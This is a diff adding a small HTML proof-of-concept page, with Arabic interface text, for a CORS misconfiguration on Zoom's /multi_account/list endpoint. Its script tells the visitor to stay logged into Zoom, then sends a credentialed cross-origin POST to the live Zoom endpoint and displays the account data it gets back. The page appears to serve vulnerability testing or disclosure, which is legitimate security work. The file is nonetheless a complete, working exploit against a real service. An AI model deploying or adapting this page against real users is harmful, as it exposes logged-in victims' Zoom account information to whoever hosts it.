@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom CORS PoC - Multi Account List</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 50px; 
+            background: #f8f9fa; 
+            color: #333;
+        }
+        button { 
+            padding: 15px 40px; 
+            font-size: 18px; 
+            background: #0d6efd; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            margin: 20px;
+        }
+        button:hover { background: #0b5ed7; }
+        pre { 
+            background: #1e1e1e; 
+            color: #00ff00; 
+            padding: 20px; 
+            text-align: left; 
+            margin: 30px auto; 
+            max-width: 900px; 
+            border-radius: 10px; 
+            white-space: pre-wrap;
+            font-size: 14px;
+        }
+        .success { color: #00ff00; }
+        .error { color: #ff4444; }
+    </style>
+</head>
+<body>
+    <h1>Zoom CORS Misconfiguration PoC</h1>
+    <h2>Endpoint: /multi_account/list</h2>
+    <p><strong>تأكد أنك مسجل الدخول في Zoom في نفس المتصفح</strong></p>
+    
+    <button onclick="testZoomCORS()">اختبار الـ CORS الآن</button>
+    
+    <h3>النتيجة:</h3>
+    <pre id="result">اضغط على الزر للبدء...</pre>
+
+    <script>
+        function testZoomCORS() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.textContent = 'جاري إرسال الطلب... يرجى الانتظار';
+
+            fetch('https://us05web.zoom.us/multi_account/list', {
+                method: 'POST',
+                credentials: 'include'
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP Error: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                resultDiv.innerHTML = `<span class="success">✅ نجح!</span><br><br>` + 
+                                      JSON.stringify(data, null, 2);
+                console.log("Zoom CORS PoC Success:", data);
+            })
+            .catch(error => {
+                resultDiv.innerHTML = `<span class="error">❌ فشل:</span> ${error.message}<br><br>تأكد من:<br>
+                - تسجيل الدخول في Zoom<br>
+                - فتح الصفحة من رابط HTTPS<br>
+                - جرب مرة أخرى`;
+                console.error("Error:", error);
+            });
+        }
+    </script>
+</body>
+</html>
